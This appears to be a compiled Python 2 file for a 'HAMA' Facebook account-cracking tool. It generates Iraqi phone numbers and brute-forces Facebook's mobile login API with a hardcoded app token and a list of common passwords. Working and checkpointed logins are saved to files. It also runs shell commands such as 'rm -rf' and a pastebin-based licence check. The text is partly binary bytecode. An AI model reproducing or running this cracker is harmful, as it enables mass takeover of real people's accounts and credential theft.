ó
 ÿc           @   sf  e  Z e r# d  d  Z   Z n  d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z e j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÍ Wd d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l	 Z	 d d l
 Z
 d d l Z d d l Z d d l Z d d l Z d d l Z d d	 l m Z d d
 l m Z d d l m Z e e  e j d  e j   Z  e  j! e   e  j" e j# j$   d d d) g e  _% d* g e  _% d+ g e  _% d, g e  _% d- g e  _% d. g e  _% d/ g e  _% d   Z& d   Z' d   Z( d   Z) d   Z* d   Z+ d Z, d  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 d   Z5 d   Z6 d    Z7 d!   Z8 d"   Z9 d#   Z: d$   Z; d%   Z< e= d& k rbe j d'  e, GHe j> d(  e<   n  d S(0   i    iÿÿÿÿNs   rm -rf .txti  iGô i s   .txtt   a(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-Agents   Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1ss   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36sb   Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02sQ   Opera/9.80 (iPhone; Opera Mini/8.0.0/34.2336; U; en) Presto/2.8.119 Version/11.10s   Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobiles   Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362s   Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/88.0.4324.150 Safari/537.36c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g©?(   t   syst   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   977945154o.pyt   mengetik$   s    c           C   s   d GHt  j j   d  S(   Nt   Keluar(   t   osR   t   exit(    (    (    s   977945154o.pyt   keluar+   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   977945154o.pyt   acak0   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   R   R   (   R   R   R   t   jR   (    (    s   977945154o.pyR   9   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
gü©ñÒMbP?(   R   R   R   R	   R
   R   (   R   R   (    (    s   977945154o.pyt   jalanD   s    c          C   sY   t  d d d d d d  8 }  x. t d  D]  } t j d  |  j d  q+ WWd  QXd  S(	   Nt   totalid   t   descs   Loading t
   bar_formats   {l_bar}{bar}g¸ëQ¸?i   (   t   tqdmt   rangeR
   R   t   update(   t   pbarR   (    (    s   977945154o.pyt   loadL   s    s4  
[1;97m`7MMF'  `7MMF'      db      `7MMM.     ,MMF'      db      
[1;97m  MM      MM       ;MM:       MMMb    dPMM       ;MM:     
[1;97m  MM      MM      ,V^MM.      M YM   ,M MM      ,V^MM.    
[1;97m  MMmmmmmmMM     ,M  `MM      M  Mb  M' MM     ,M  `MM    
[1;97m  MM      MM     AbmmmqMA     M  YM.P'  MM     AbmmmqMA   
[1;97m  MM      MM    A'     VML    M  `YM'   MM    A'     VML  
[1;97m.JMML.  .JMML..AMA.   .AMMA..JML. `'  .JMML..AMA.   .AMMA.
                                                          

[1;97mMy Telegram : [1;97m@HAMAIOS
    c           C   s1   t  j d  t GHd GHd GHd GHd GHt   d  S(   Nt   clears8   [1;97m
~~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~~~~s-   [1;97m[[1;97m1[1;97m][1;97m CRACK NUMBERSs1   [1;97m[[1;97m0[1;97m][1;97m Exit this program(   R   t   systemt   logot
   pilih_menu(    (    (    s   977945154o.pyt   menug   s    c          C   s{   t  d  }  |  d k r' d GHt   nP |  d k s? |  d k rI t   n. |  d k sa |  d k rk t   n d GHt   d  S(   Ns@   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [97mR   s-   [1;97m[[1;97m![1;97m][1;97m Wrong input !t   1t   0s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   t	   raw_inputR0   t   crack_nomorR   (   t   unikers(    (    s   977945154o.pyR0   q   s    


c           C   s6   t  j d  t GHd GHd GHd GHd GHd GHt   d  S(   NR-   s7   [1;97m
~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~~~~s7   [1;97m[[1;97m1[1;97m][1;97m CRACK NUMBERS KURDSTAN s9   [1;97m[[1;97m2[1;97m][1;97m CRACK NUMBERS Free Mod   s6   [1;97m[[1;71m0[1;97m][1;97m Back To Menu          s8   [1;97m
~~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~~~~(   R   R.   R/   t   pilih(    (    (    s   977945154o.pyR5      s    c          C   s   t  d  }  |  d k r' d GHt   nr |  d k s? |  d k rI t   nP |  d k sa |  d k rk t   n. |  d k s |  d k r t   n d GHt   d  S(   NsB   [1;97m[[97mâ¢[1;97m] [1;97m( [1;97mChoose[1;97m ) > [1;97mR   s-   [1;97m[[1;97mx[1;97m][1;97m Wrong input !R2   t   2R3   s'   [1;97m[[1;97mÃ·[1;97m] Wrong input !(   R4   R7   t   HAMAt   A7AR1   (   R6   (    (    s   977945154o.pyR7      s    



c             sÖ  t  j d  t GHd GHd GHd GHd d GHyq t d    t    d k  rW t d	  n d
 d  d }  x0 t |  d  j   D] } t j	 | j
    q} WWn' t k
 rÄ d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  qWd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd GHd GHt d   t  j d!  d  S("   NR-   s   [1;97m750-751s   [1;97m780-781-782-783s   [1;97m777-770-771-772-773i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   +964s   .txtt   rs   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s8   [1;97m
~~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~~~~c            sm	  |  } y t  j d  Wn t k
 r* n Xy4	| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k rTd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n
d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n[d | d k rzd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  näd } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n5d | d k r d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n¾d }	 t j d    | d |	 d  } t j |  } d | k rOd    | d |	 GHt d d	  } | j    | |	 d
  | j   t	 j
   | |	  nd | d k rÆd    | d |	 GHt d d	  } | j    | |	 d
  | j   t j
   | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rud    | d |
 GHt d d	  } | j    | |
 d
  | j   t	 j
   | |
  néd | d k rìd    | d |
 GHt d d	  } | j    | |
 d
  | j   t j
   | |
  nrd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nÃd | d k rd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k rÁd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k r8d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k rçd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nw d | d k r^	d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   anggaxd/clone.txtR    s   
s   www.facebook.comt	   error_msgs#   [1;92m[[1;92mcheck-point[1;92m] t
   1122334455s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m t   112233445566t   112233112233t
   1234512345t
   1234554321t   123321t	   123456789(   R   t   mkdirt   OSErrort   brt   opent   jsonR,   R   t   closet   okst   appendt   cpb(   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8(   t   ct   k(    s   977945154o.pyt   main»   s    '

'

'

'

'

'

'

'

i   s3   [1;97m~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msA   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/kurd.txts   [1;97m[[1;97m BACK [1;97m]s   python2 HAMA.py(   R   R.   R/   R4   R   R   RI   t	   readlinest   idRM   t   stript   IOErrorR1   R"   R$   R
   R   R   R   R	   R   t   mapRL   t   cekpoint(   t   idlistt   linet   xxxt   titikt   oR_   t   p(    (   R]   R^   s   977945154o.pyR9      sL    	"

)
c             sÛ  t  j d  t GHd GHd GHd GHd GHd d GHyq t d    t    d	 k  r\ t d
  n d d  d }  x0 t |  d  j   D] } t j	 | j
    q WWn' t k
 rÉ d GHt d  t   n Xt t t   } t d |  t j d  t d  t j d  d d d g } x0 | D]( } d | Gt j j   t j d  q$Wd GH   f d   } t d  } | j | t  d GHd GHd t t t   d t t t   GHd  GHd GHt d!  t  j d"  d  S(#   NR-   s   [1;97m  Crack Number Free Mods   [1;97m750-751s   [1;97m780-781-782-783s   [1;97m777-770-771-772-773i2   s   [1;97m~s@   [1;97m[[1;97mâ¢[1;97m][1;97m Choose Number [1;97m :[1;97mi   s5   [1;97m[[1;97m![1;97m][1;97m Kode Wajib 3 Digit !!R   s   +964s   .txtR;   s   [!] File Not Founds   
[ Kembali ]s?   [1;97m[[1;97mâ¢[1;97m][1;97m Total Number [1;97m:[1;97m g      à?s+   [1;92m[[1;92m![1;92m] [1;92mDon't closes   .   s   ..  s   ... s1   [1;92m[[1;92mâ¢[1;92m][1;92m Crack Running i   s8   [1;97m
~~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~~~~c            sm	  |  } y t  j d  Wn t k
 r* n Xy4	| } t j d    | d | d  } t j |  } d | k rÝ d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k rTd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n
d } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n[d | d k rzd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  näd } t j d    | d | d  } t j |  } d | k r)d    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  n5d | d k r d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n¾d }	 t j d    | d |	 d  } t j |  } d | k rOd    | d |	 GHt d d	  } | j    | |	 d
  | j   t	 j
   | |	  nd | d k rÆd    | d |	 GHt d d	  } | j    | |	 d
  | j   t j
   | |	  nd }
 t j d    | d |
 d  } t j |  } d | k rud    | d |
 GHt d d	  } | j    | |
 d
  | j   t	 j
   | |
  néd | d k rìd    | d |
 GHt d d	  } | j    | |
 d
  | j   t j
   | |
  nrd } t j d    | d | d  } t j |  } d | k rd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nÃd | d k rd    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  nLd } t j d    | d | d  } t j |  } d | k rÁd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nd | d k r8d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n&d } t j d    | d | d  } t j |  } d | k rçd    | d | GHt d d	  } | j    | | d
  | j   t	 j
   | |  nw d | d k r^	d    | d | GHt d d	  } | j    | | d
  | j   t j
   | |  n  Wn n Xd  S(   NR<   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmR=   s#   [1;92m[[1;92msuccessfull[1;92m] s	    [1;92m s   anggaxd/clone.txtR    s   
s   www.facebook.comR>   s#   [1;92m[[1;92mcheck-point[1;92m] R?   s#   [1;97m[[1;97mcheck-point[1;97m] s	    [1;97m R@   RA   RB   RC   RD   RE   (   R   RF   RG   RH   RI   RJ   R,   R   RK   RL   RM   RN   (   RO   RP   RQ   RR   RS   RT   RU   RV   RW   RX   RY   RZ   R[   R\   (   R]   R^   (    s   977945154o.pyR_   q  s    '

'

'

'

'

'

'

'

i   s3   [1;97m~~~~~~~~~~~~~~~~~~~ HAMA ~~~~~~~~~~~~~~~~~~~s1   [1;97m[[1;97mâ¢[1;97m] [1;97mCrack done ....sS   [1;97m[[1;97mâ¢[1;97m] [1;97mTotal [1;97mOK[1;97m/[1;97mCP [1;97m: [1;97ms   [1;97m/[1;97msB   [1;97m[[1;97mâ¢[1;97m] [1;97mCP/OK tersimpan : save/kurd1.txts   [1;97m[[1;97m BACK [1;97m]s   python2 HAMA.py(   R   R.   R/   R4   R   R   RI   R`   Ra   RM   Rb   Rc   R1   R"   R$   R
   R   R   R   R	   R   Rd   RL   Re   (   Rf   Rg   Rh   Ri   Rj   R_   Rk   (    (   R]   R^   s   977945154o.pyR:   O  sN    	"

)
c          C   si   t  j d  }  t j |  j  } | d } t j d  t d d  } | j |  | j	   t
   d  S(   Ns   https://httpbin.org/uuidt   uuids$   touch /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR   (   t   requestst   getRJ   t   loadst   textR   R.   RI   R   RK   t   chk(   Rl   t   jsonidt   idjscrt   reb(    (    s   977945154o.pyt   idcr  s    

c          C   sÊ   t  j d  }  d |  k r¿ t  j d  t d d  j   } d t |  GHt j d  j } | | k r d GHt	 j
 d	  t  j d
  t   qÆ t  j d
  d GHt	 j
 d	  t j   n t   d  S(   Ns   /data/data/com.termux/s   beta.txts(   chmod 777 /data/data/com.termux/beta.txts   /data/data/com.termux/beta.txtR;   s
   Your ID : s!   https://pastebin.com/raw/x6gsnD3Ps   [1;92mYour ID is Active  .... i   s(   chmod 000 /data/data/com.termux/beta.txts!   [31;1mYour ID Isn't Active .....(   R   t   listdirR.   RI   t   readR"   Rm   Rn   Rp   R
   R   R1   R   R   Ru   (   R   t   readidt
   textupload(    (    s   977945154o.pyRq     s     
t   __main__R-   i   (   s
   User-Agents   Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1(   s
   User-Agentss   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36(   s
   User-Agentsb   Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02(   s
   User-AgentsQ   Opera/9.80 (iPhone; Opera Mini/8.0.0/34.2336; U; en) Presto/2.8.119 Version/11.10(   s
   User-Agents   Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile(   s
   User-Agents   Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362(   s
   User-Agents   Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/88.0.4324.150 Safari/537.36(?   t   Falset   foot   barR   R   R
   t   datetimeR   t   hashlibt   ret	   threadingRJ   t   urllibt	   cookielibt   getpassR.   R)   t   nR   t   nmbrRI   R   R	   Rm   t	   mechanizet   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRH   t   set_handle_robotst   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R$   R,   R/   t   backt   berhasilRe   RL   RT   Ra   RN   RU   R1   R0   R5   R7   R9   R:   Ru   Rq   t   __name__R   (    (    (    s   977945154o.pyt   <module>   sl   

								
				µ	¶		